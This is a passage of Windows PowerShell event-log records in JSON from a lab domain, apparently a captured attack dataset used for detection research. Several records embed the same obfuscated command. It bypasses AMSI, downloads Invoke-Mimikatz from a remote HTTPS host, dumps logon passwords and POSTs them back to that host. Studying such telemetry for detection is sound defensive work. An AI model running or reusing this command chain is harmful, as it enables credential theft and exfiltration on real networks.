7d116t105}111z110z47}120}45A119t119z119}45N102,111N114}109A45d117A114t108z101N110A99A111}100}101A100z39A10t36z98}121,116A101z115A32A61}32}91N83}121A115W116N101d109A46}84}101W120N116}46N69,110}99W111W100}105t110,103A93,58A58z65z83W67d73t73W46A71N101}116t66}121,116A101}115A40,36N99A109A100A41z10A36A114z101A113}117,101N115A116W46,67d111d110z116z101t110A116}76}101z110t103}116A104,32}61t32N36d98,121N116z101}115N46}76z101N110,103z116W104}10A36d114d101A113N117}101A115d116}83z116A114A101,97N109z32,61}32}36}114W101t113N117,101W115A116}46A71}101W116A82z101A113A117N101t115N116t83A116A114}101d97d109}40}41t10z36A114t101d113A117}101A115A116A83N116}114d101}97W109A46,87z114d105,116A101,40}36W98N121z116z101t115}44A32z48}44d32}36A98W121t116A101}115W46,76N101t110W103}116,104t41d10A36z114N101}113A117}101}115d116}83A116N114t101W97W109W46,67}108}111}115d101t40t41A10z36W114}101t113t117N101A115N116t46d71t101W116}82W101z115}112}111A110d115}101}40,41'.SPlIT('Nz}tAdA,}W') | ForEach-ObJEct { ([int] $_ -AS [ChAR]) } ) +$( set-itEM 'VaRiAble:Ofs' ' ' ) ) \r\n        Engine Version = 5.1.19041.906\r\n        Runspace ID = 360ae8a1-a99e-45cc-8fc5-bf2bf5bc514c\r\n        Pipeline ID = 1\r\n        Command Name = Set-StrictMode\r\n        Command Type = Cmdlet\r\n        Script Name = \r\n        Command Path = \r\n        Sequence Number = 39\r\n        User = OFFSEC\\admmig\r\n        Connected User = \r\n        Shell ID = Microsoft.PowerShell\r\n","UserData":"","Payload":"CommandInvocation(Set-StrictMode): \"Set-StrictMode\"\r\nParameterBinding(Set-StrictMode): name=\"Version\"; value=\"1.0\"\r\n"}}}
{"Event_attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"Event":{"System":{"Provider_attributes":{"Name":"Microsoft-Windows-PowerShell","Guid":"A0C1853B-5C40-4B15-8766-3CF1C58F985A"},"EventID":4104,"Version":1,"Level":5,"Task":2,"Opcode":15,"Keywords":"0x0","TimeCreated_attributes":{"SystemTime":"2021-04-30T20:32:57.274494Z"},"EventRecordID":1175,"Correlation_attributes":{"ActivityID":"B802B918-3B51-0001-737B-16B8513BD701"},"Execution_attributes":{"ProcessID":6760,"ThreadID":10624},"Channel":"Microsoft-Windows-PowerShell/Operational","Computer":"win10-02.offsec.lan","Security_attributes":{"UserID":"S-1-5-21-4230534742-2542757381-3142984815-1111"}},"EventData":{"MessageNumber":1,"MessageTotal":1,"ScriptBlockText":"{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }","ScriptBlockId":"4b2fb04d-daad-4078-8bd1-4d86abccdbc8","Path":""}}}
{"Event_attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"Event":{"System":{"Provider_attributes":{"Name":"Microsoft-Windows-PowerShell","Guid":"A0C1853B-5C40-4B15-8766-3CF1C58F985A"},"EventID":4103,"Version":1,"Level":4,"Task":106,"Opcode":20,"Keywords":"0x0","TimeCreated_attributes":{"SystemTime":"2021-04-30T20:32:57.369558Z"},"EventRecordID":1176,"Correlation_attributes":{"ActivityID":"B802B918-3B51-0001-747B-16B8513BD701"},"Execution_attributes":{"ProcessID":6760,"ThreadID":10624},"Channel":"Microsoft-Windows-PowerShell/Operational","Computer":"win10-02.offsec.lan","Security_attributes":{"UserID":"S-1-5-21-4230534742-2542757381-3142984815-1111"}},"EventData":{"ContextInfo":"        Severity = Informational\r\n        Host Name = Default Host\r\n        Host Version = 5.1.19041.906\r\n        Host ID = 7022b4ad-206e-4ed0-9526-c5d31e47bc1c\r\n        Host Application = powershell.exe -exec bypass -noni -nop -w 1 -C . ( $PsHoME[4]+$PsHoME[34]+'X')(  $(Sv 'Ofs' '' ) +[StriNG]('91A78}101d116,46t83d101A114d118A105A99A101W80N111N105N110N116d77}97A110z97}103z101A114N93,58A58N83d101}114}118t101t114}67A101t114A116N105W102}105,99A97t116}101,86}97}108W105W100z97}116,105}111}110W67,97N108A108}98}97}99A107,32A61t32N123t36}116,114A117}101A125N10A116A114A121}123}10}91}82W101W102A93A46d65}115,115}101d109t98,108t121t46}71z101N116N84t121z112d101d40t39z83N121d115z39}43z39t116N101A109d46}77d97d110N39A43z39W97d103W101W109t101}110N116W46d65A117z116z39W43d39}111d109A97z116}105A111z110z46W65A109}39z43A39}115t105}85t116}39N43z39d105A108A115t39z41N46W71W101}116z70d105N101A108t100,40}39,97}109d39A43W39z115}105}73d110}105}39d43t39A116t70t97N105N108}101d100A39z44z32N39W78A111A110z80W39z43d39,117t98N108}105t99}44N83,116W97}39}43A39}116W105,99W39}41z46A83N101,116z86d97}108t117N101z40A36N110d117A108A108z44N32}36}116}114,117A101N41W10,125,99}97A116A99,104d123t125A10}91t78t101}116,46,83d101W114z118}105N99A101d80A111,105t110}116W77,97N110d97,103A101}114W93}58t58}83A101d114z118t101A114A67N101W114d116,105N102d105N99}97,116W101z86t97}108}105A100A97,116z105A111z110}67W97d108d108}98}97z99,107N32N61,32,123}36d116t114}117}101N125}10N91A83}121,115A116}101z109A46}78}101W116N46A83}101,114,118,105}99N101,80,111A105z110A116A77A97,110N97t103t101t114}93}58d58t83N101t99,117d114z105A116d121,80}114,111}116,111}99A111W108W32}61A32W91W83z121W115}116t101}109d46}78A101t116N46t83N101A99}117d114W105d116A121}80d114W111t116z111}99d111z108}84z121N112z101,93A39,83A115z108,51d44W84}108z115A44N84A108t115A49W49N44,84}108}115N49d50,39W10t73t69t88W32}40A78A101A119A45A79d98d106t101z99}116A32W78}101W116t46}87,101N98A67,108A105d101}110d116,41A46z68d111N119N110z108A111}97A100z83t116A114A105A110,103,40A39d104d116N116N112A115t58A47N47z49}48z46,50}51A46}49d50t51N46}49A49A58N52}52}51W47}73W110A118}111A107}101N45t77}105A109}105,107W97t116z122z46,112t115}49A39,41d10t36d99t109z100t32W61d32t73}110,118,111}107d101W45W77z105}109}105,107d97z116d122W32d45t67z111A109W109}97d110t100t32A39,112A114}105N118W105}108N101}103z101N58,58t100d101t98z117t103W32W115W101}107t117d114z108A115}97,58N58W108A111A103A111}110A112A97A115N115z119d111}114d100A115N32N101,120}105}116z39}10,36A114}101z113d117N101}115t116N32d61t32A91}83d121A115W116W101d109t46N78t101A116A46}87z101W98z82t101W113d117A101t115d116d93d58N58W67,114}101d97A116}101z40}39N104N116}116t112,115W58t47d47N49A48d46}50A51A46}49,50N51N46}49A49,58t52d52}51}47}39}41A10z36N114}101z113z117N101A115W116A46d77t101W116W104A111t100,32,61z32,39d80,79,83W84d39z10}36t114A101t113d117W101t115N116z46d67}111A110t116z101z110}116t84d121}112A101}32A61t32A39z97d112W112W108}105,99N97d116t105}111z110z47}120}45A119t119z119}45N102,111N114}109A45d117A114t108z101N110A99A111}100}101A100z39A10t36z98}121,116A101z115A32A61}32}91N83}121A115W116N101d109A46}84}101W120N116}46N69,110}99W111W100}105t110,103A93,58A58z65z83W67d73t73W46A71N101}116t66}121,116A101}115A40,36N99A109A100A41z10A36A114z101A113}117,101N115A116W46,67d111d110z116z101t110A116}76}101z110t103}116A104,32}61t32N36d98,121N116z101}115N46}76z101N110,103z116W104}10A36d114d101A113N117}101A115d116}83z116A114A101,97N109z32,61}32}36}114W101t113N117,101W115A116}46A71}101W116A82z101A113A117N101t115N116t83A116A114}101d97d109}40}41t10z36A114t101d113A117}101A115A116A83N116}114d101}97W109A46,87z114d105,116A101,40}36W98N121z116z101t115}44A32z48}44d32}36A98W121t116A101}115W46,76N101t110W103}116,104t41d10A36z114N101}113A117}101}115d116}83A116N114t101W97W109W46,67}108}111}115d101t40t41A10z36W114}101t113t117N101A115N116t46d71t101W116}82W101z115}112}111A110d115}101}40,41'.SPlIT('Nz}tAdA,}W') | ForEach-ObJEct { ([int] $_ -AS [ChAR]) } ) +$( set-itEM 'VaRiAble:Ofs' ' ' ) ) \r\n        Engine Version = 5.1.19041.906\r\n        Runspace ID = 360ae8a1-a99e-45cc-8fc5-bf2bf5bc514c\r\n        Pipeline ID = 1\r\n        Command Name = Set-StrictMode\r\n        Command Type = Cmdlet\r\n        Script Name = \r\n        Command Path = \r\n        Sequence Number = 41\r\n        User = OFFSEC\\admmig\r\n        Connected User = \r\n        Shell ID = Microsoft.PowerShell\r\n","UserData":"","Payload":"CommandInvocation(Set-StrictMode): \"Set-StrictMode\"\r\nParameterBinding(Set-StrictMode): name=\"Version\"; value=\"1.0\"\r\n"}}}
{"Event_attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"Event":{"System":{"Provider_attributes":{"Name":"Microsoft-Windows-PowerShell","Guid":"A0C1853B-5C40-4B15-8766-3CF1C58F985A"},"EventID":4104,"Version":1,"Level":5,"Task":2,"Opcode":15,"Keywords":"0x0","TimeCreated_attributes":{"SystemTime":"2021-04-30T20:32:57.422781Z"},"EventRecordID":1177,"Correlation_attributes":{"ActivityID":"B802B918-3B51-0001-757B-16B8513BD701"},"Execution_attributes":{"ProcessID":6760,"ThreadID":10624},"Channel":"Microsoft-Windows-PowerShell/Operational","Computer":"win10-02.offsec.lan","Security_attributes":{"UserID":"S-1-5-21-4230534742-2542757381-3142984815-1111"}},"EventData":{"MessageNumber":1,"MessageTotal":1,"ScriptBlockText":"{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }","ScriptBlockId":"35809001-f766-429c-acd4-ef9e35bfbfc6","Path":""}}}
{"Event_attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"Event":{"System":{"Provider_attributes":{"Name":"Microsoft-Windows-PowerShell","Guid":"A0C1853B-5C40-4B15-8766-3CF1C58F985A"},"EventID":4103,"Version":1,"Level":4,"Task":106,"Opcode":20,"Keywords":"0x0","TimeCreated_attributes":{"SystemTime":"2021-04-30T20:32:57.425879Z"},"EventRecordID":1178,"Correlation_attributes":{"ActivityID":"B802B918-3B51-0001-767B-16B8513BD701"},"Execution_attributes":{"ProcessID":6760,"ThreadID":10624},"Channel":"Microsoft-Windows-PowerShell/Operational","Computer":"win10-02.offsec.lan","Security_attributes":{"UserID":"S-1-5-21-4230534742-2542757381-3142984815-1111"}},"EventData":{"ContextInfo":"        Severity = Informational\r\n        Host Name = Default Host\r\n        Host Version = 5.1.19041.906\r\n        Host ID = 7022b4ad-206e-4ed0-9526-c5d31e47bc1c\r\n        Host Application = powershell.exe -exec bypass -noni -nop -w 1 -C . ( $PsHoME[4]+$PsHoME[34]+'X')(  $(Sv 'Ofs' '' ) +[StriNG]('91A78}101d116,46t83d101A114d118A105A99A101W80N111N105N110N116d77}97A110z97}103z101A114N93,58A58N83d101}114}118t101t114}67A101t114A116N105W102}105,99A97t116}101,86}97}108W105W100z97}116,105}111}110W67,97N108A108}98}97}99A107,32A61t32N123t36}116,114A117}101A125N10A116A114A121}123}10}91}82W101W102A93A46d65}115,115}101d109t98,108t121t46}71z101N116N84t121z112d101d40t39z83N121d115z39}43z39t116N101A109d46}77d97d110N39A43z39W97d103W101W109t101}110N116W46d65A117z116z39W43d39}111d109A97z116}105A111z110z46W65A109}39z43A39}115t105}85t116}39N43z39d105A108A115t39z41N46W71W101}116z70d105N101A108t100,40}39,97}109d39A43W39z115}105}73d110}105}39d43t39A116t70t97N105N108}101d100A39z44z32N39W78A111A110z80W39z43d39,117t98N108}105t99}44N83,116W97}39}43A39}116W105,99W39}41z46A83N101,116z86d97}108t117N101z40A36N110d117A108A108z44N32}36}116}114,117A101N41W10,125,99}97A116A99,104d123t125A10}91t78t101}116,46,83d101W114z118}105N99A101d80A111,105t110}116W77,97N110d97,103A101}114W93}58t58}83A101d114z118t101A114A67N101W114d116,105N102d105N99}97,116W101z86t97}108}105A100A97,116z105A111z110}67W97d108d108}98}97z99,107N32N61,32,123}36d116t114}117}101N125}10N91A83}121,115A116}101z109A46}78}101W116N46A83}101,114,118,105}99N101,80,111A105z110A116A77A97,110N97t103t101t114}93}58d58t83N101t99,117d114z105A116d121,80}114,111}116,111}99A111W108W32}61A32W91W83z121W115}116t101}109d46}78A101t116N46t83N101A99}117d114W105d116A121}80d114W111t116z111}99d111z108}84z121N112z101,93A39,83A115z108,51d44W84}108z115A44N84A108t115A49W49N44,84}108}115N49d50,39W10t73t69t88W32}40A78A101A119A45A79d98d106t101z99}116A32W78}101W116t46}87,101N98A67,108A105d101}110d116,41A46z68d111N119N110z108A111}97A100z83t116A114A105A110,103,40A39d104d116N116N112A115t58A47N47z49}48z46,50}51A46}49d50t51N46}49A49A58N52}52}51W47}73W110A118}111A107}101N45t77}105A109}105,107W97t116z122z46,112t115}49A39,41d10t36d99t109z100t32W61d32t73}110,118,111}107d101W45W77z105}109}105,107d97z116d122W32d45t67z111A109W109}97d110t100t32A39,112A114}105N118W105}108N101}103z101N58,58t100d101t98z117t103W32W115W101}107t117d114z108A115}97,58N58W108A111A103A111}110A112A97A115N115z119d111}114d100A115N32N101,120}105}116z39}10,36A114}101z113d117N101}115t116N32d61t32A91}83d121A115W116W101d109t46N78t101A116A46}87z101W98z82t101W113d117A101t115d116d93d58N58W67,114}101d97A116}101z40}39N104N116}116t112,115W58t47d47N49A48d46}50A51A46}49,50N51N46}49A49,58t52d52}51}47}39}41A10z36N114}101z113z117N101A115W116A46d77t101W116W104A111t100,32,61z32,39d80,79,83W84d39z10}36t114A101t113d117W101t115N116z46d67}111A110t116z101z110}116t84d121}112A101}32A61t32A39z97d112W112W108}105,99N97d116t105}111z110z47}120}45A119t119z119}45N102,111N114}109A45d117A114t108z101N110A99A111}100}101A100z39A10t36z98}121,116A101z115A32A61}32}91N83}121A115W116N101d109A46}84}101W120N116}46N69,110}99W111W100}105t110,103A93,58A58z65z83W67d73t73W46A71N101}116t66}121,116A101}115A40,36N99A109A100A41z10A36A114z101A113}117,101N115A116W46,67d111d110z116z101t110A116}76}101z110t103}116A104,32}61t32N36d98,121N116z101}115N46}76z101N110,103z116W104}10A36d114d101A113N117}101A115d116}83z116A114A101,97N109z32,61}32}36}114W101t113N117,101W115A116}46A71}101W116A82z101A113A117N101t115N116t83A116A114}101d97d109}40}41t10z36A114t101d113A117}101A115A116A83N116}114d101}97W109A46,87z114d105,116A101,40}36W98N121z116z101t115}44A32z48}44d32}36A98W121t116A101}115W46,76N101t110W103}116,104t41d10A36z114N101}113A117}101}115d116}83A116N114t101W97W109W46,67}108}111}115d101t40t41A10z36W114}101t113t117N101A115N116t46d71t101W116}82W101z115}112}111A110d115}101}40,41'.SPlIT('Nz}tAdA,}W') | ForEach-ObJEct { ([int] $_ -AS [ChAR]) } ) +$( set-itEM 'VaRiAble:Ofs' ' ' ) ) \r\n        Engine Version = 5.1.19041.906\r\n        Runspace ID = 360ae8a1-a99e-45cc-8fc5-bf2bf5bc514c\r\n        Pipeline ID = 1\r\n        Command Name = Set-StrictMode\r\n        Command Type = Cmdlet\r\n        Script Name = \r\n        Command Path = \r\n        Sequence Number = 43\r\n        User = OFFSEC\\admmig\r\n        Connected User = \r\n        Shell ID = Microsoft.PowerShell\r\n","UserData":"","Payload":"CommandInvocation(Set-StrictMode): \"Set-StrictMode\"\r\nParameterBinding(Set-StrictMode): name=\"Version\"; value=\"1.0\"\r\n"}}}
{"Event_attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"Event":{"System":{"Provider_attributes":{"Name":"Microsoft-Windows-PowerShell","Guid":"A0C1853B-5C40-4B15-8766-3CF1C58F985A"},"EventID":4104,"Version":1,"Level":5,"Task":2,"Opcode":15,"Keywords":"0x0","TimeCreated_attributes":{"SystemTime":"2021-04-30T20:32:57.450411Z"},"EventRecordID":1179,"Correlation_attributes":{"ActivityID":"B802B918-3B51-0000-F66A-16B8513BD701"},"Execution_attributes":{"ProcessID":6760,"ThreadID":10624},"Channel":"Microsoft-Windows-PowerShell/Operational","Computer":"win10-02.offsec.lan","Security_attributes":{"UserID":"S-1-5-21-4230534742-2542757381-3142984815-1111"}},"EventData":{"MessageNumber":1,"MessageTotal":1,"ScriptBlockText":"{ Set-StrictMode -Version 1; $_.OriginInfo }","ScriptBlockId":"7203a4be-4833-41e6-91cf-80977e19f45e","Path":""}}}
{"Event_attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"Event":{"System":{"Provider_attributes":{"Name":"Microsoft-Windows-PowerShell","Guid":"A0C1853B-5C40-4B15-8766-3CF1C58F985A"},"EventID":4103,"Version":1,"Level":4,"Task":106,"Opcode":20,"Keywords":"0x0","TimeCreated_attributes":{"SystemTime":"2021-04-30T20:32:57.469591Z"},"EventRecordID":1180,"Correlation_attributes":{"ActivityID":"B802B918-3B51-0000-F76A-16B8513BD701"},"Execution_attributes":{"ProcessID":6760,"ThreadID":10624},"Channel":"Microsoft-Windows-PowerShell/Operational","Computer":"win10-02.offsec.lan","Security_attributes":{"UserID":"S-1-5-21-4230534742-2542757381-3142984815-1111"}},"EventData":{"ContextInfo":"        Severity = Informational\r\n        Host Name = Default Host\r\n        Host Version = 5.1.19041.906\r\n        Host ID = 7022b4ad-206e-4ed0-9526-c5d31e47bc1c\r\n        Host Application = powershell.exe -exec bypass -noni -nop -w 1 -C . ( $PsHoME[4]+$PsHoME[34]+'X')(  $(Sv 'Ofs' '' ) +[StriNG]('91A78}101d116,46t83d101A114d118A105A99A101W80N111N105N110N116d77}97A110z97}103z101A114N93,58A58N83d101}114}118t101t114}67A101t114A116N105W102}105,99A97t116}101,86}97}108W105W100z97}116,105}111}110W67,97N108A108}98}97}99A107,32A61t32N123t36}116,114A117}101A125N10A116A114A121}123}10}91}82W101W102A93A46d65}115,115}101d109t98,108t121t46}71z101N116N84t121z112d101d40t39z83N121d115z39}43z39t116N101A109d46}77d97d110N39A43z39W97d103W101W109t101}110N116W46d65A117z116z39W43d39}111d109A97z116}105A111z110z46W65A109}39z43A39}115t105}85t116}39N43z39d105A108A115t39z41N46W71W101}116z70d105N101A108t100,40}39,97}109d39A43W39z115}105}73d110}105}39d43t39A116t70t97N105N108}101d100A39z44z32N39W78A111A110z80W39z43d39,117t98N108}105t99}44N83,116W97}39}43A39}116W105,99W39}41z46A83N101,116z86d97}108t117N101z40A36N110d117A108A108z44N32}36}116}114,117A101N41W10,125,99}97A116A99,104d123t125A10}91t78t101}116,46,83d101W114z118}105N99A101d80A111,105t110}116W77,97N110d97,103A101}114W93}58t58}83A101d114z118t101A114A67N101W114d116,105N102d105N99}97,116W101z86t97}108}105A100A97,116z105A111z110}67W97d108d108}98}97z99,107N32N61,32,123}36d116t114}117}101N125}10N91A83}121,115A116}101z109A46}78}101W116N46A83}101,114,118,105}99N101,80,111A105z110A116A77A97,110N97t103t101t114}93}58d58t83N101t99,117d114z105A116d121,80}114,111}116,111}99A111W108W32}61A32W91W83z121W115}116t101}109d46}78A101t116N46t83N101A99}117d114W105d116A121}80d114W111t116z111}99d111z108}84z121N112z101,93A39,83A115z108,51d44W84}108z115A44N84A108t115A49W49N44,84}108}115N49d50,39W10t73t69t88W32}40A78A101A119A45A79d98d106t101z99}116A32W78}101W116t46}87,101N98A67,108A105d101}110d116,41A46z68d111N119N110z108A111}97A100z83t116A114A105A110,103,40A39d104d116N116N112A115t58A47N47z49}48z46,50}51A46}49d50t51N46}49A49A58N52}52}51W47}73W110A118}111A107}101N45t77}105A109}105,107W97t116z122z46,112t115}49A39,41d10t36d99t109z100t32W61d32t73}110,118,111}107d101W45W77z105}109}105,107d97z116d122W32d45t67z111A109W109}97d110t100t32A39,112A114}105N118W105}108N101}103z101N58,58t100d101t98z117t103W32W115W101}107t117d114z108A115}97,58N58W108A111A103A111}110A112A97A115N115z119d111}114d100A115N32N101,120}105}116z39}10,36A114}101z113d117N101}115t116N32d61t32A91}83d121A115W116W101d109t46N78t101A116A46}87z101W98z82t101W113d117A101t115d116d93d58N58W67,114}101d97A116}101z40}39N104N116}116t112,115W58t47d47N49A48d46}50A51A46}49,50N51N46}49A49,58t52d52}51}47}39}41A10z36N114}101z113z117N101A115W116A46d77t101W116W104A111t100,32,61z32,39d80,79,83W84d39z10}36t114A101t113d117W101t115N116z46d67}111A110t116z101z110}116t84d121}112A101}32A61t32A39z97d112W112W108}105,99N97d116t105}111z110z47}120}45A119t119z119}45N102,111N114}109A45d117A114t108z101N110A99A111}100}101A100z39A10t36z98}121,116A101z115A32A61}32}91N83}121A115W116N101d109A46}84}101W120N116}46N69,110}99W111W100}105t110,103A93,58A58z65z83W67d73t73W46A71N101}116t66}121,116A101}115A40,36N99A109A100A41z10A36A114z101A113}117,101N115A116W46,67d111d110z116z101t110A116}76}101z110t103}116A104,32}61t32N36d98,121N116z101}115N46}76z101N110,103z116W104}10A36d114d101A113N117}101A115d116}83z116A114A101,97N109z32,61}32}36}114W101t113N117,101W115A116}46A71}101W116A82z101A113A117N101t115N116t83A116A114}101d97d109}40}41t10z36A114t101d113A117}101A115A116A83N116}114d101}97W109A46,87z114d105,116A101,40}36W98N121z116z101t115}44A32z48}44d32}36A98W121t116A101}115W46,76N101t110W103}116,104t41d10A36z114N101}113A117}101}115d116}83A116N114t101W97W109W46,67}108}111}115d101t40t41A10z36W114}101t113t117N101A115N116t46d71t101W116}82W101z115}112}111A110d115}101}40,41'.SPlIT('Nz}tAdA,}W') | ForEach-ObJEct { ([int] $_ -AS [ChAR]) } ) +$( set-itEM 'VaRiAble:Ofs' ' ' ) ) \r\n        Engine Version = 5.1.19041.906\r\n        Runspace ID = 360ae8a1-a99e-45cc-8fc5-bf2bf5bc514c\r\n        Pipeline ID = 1\r\n        Command Name = Set-StrictMode\r\n        Command Type = Cmdlet\r\n        Script Name = \r\n        Command Path = \r\n        Sequence Number = 45\r\n        User = OFFSEC\\admmig\r\n        Connected User = \r\n        Shell ID = Microsoft.PowerShell\r\n","UserData":"","Payload":"CommandInvocation(Set-StrictMode): \"Set-StrictMode\"\r\nParameterBinding(Set-StrictMode): name=\"Version\"; value=\"1.0\"\r\n"}}}
